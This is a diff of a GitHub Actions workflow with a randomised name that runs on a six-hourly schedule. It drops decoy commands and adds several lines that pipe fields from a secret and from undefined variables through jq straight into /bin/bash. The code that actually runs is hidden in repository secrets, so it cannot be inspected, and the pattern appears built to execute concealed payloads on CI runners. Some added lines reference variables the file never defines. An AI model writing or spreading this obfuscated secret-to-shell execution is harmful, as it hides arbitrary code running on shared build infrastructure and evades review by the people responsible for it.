@@ -1,27 +1,20 @@
 name: tianpoguang1937
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '52 3/6 * * *'
-jobs:  # 29535
+    - cron: '54 4/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: tianpoguang1937
         env:
-          h24536: ${{ secrets.h24536 }}
+          hushk37: ${{ secrets.hushk37 }}
         run: |
-          echo "Date only: $(date +%F)"
-          [ -z "$RANDOM" ] || echo "Random var set"
-          echo $h24536 | jq -r .v22305 | /bin/bash
-          git pull -r
-          curl ipinfo.io
-          echo "Build $(date +%s)"
-          find /tmp -maxdepth 1 -type f 2>/dev/null | head -1 || true
-          which apt-get
-          ping -c 10 github.com
-          cd ~
-          pushd ~ > /dev/null
-          which screen
+          echo $hushk37 | jq -r .gpd8 | /bin/bash
+          echo $ekly3 | jq -r .o723 | /bin/bash
+          echo $v95 | jq -r .kza0862 | /bin/bash
+          echo $eh62 | jq -r .oog8 | /bin/bash
+
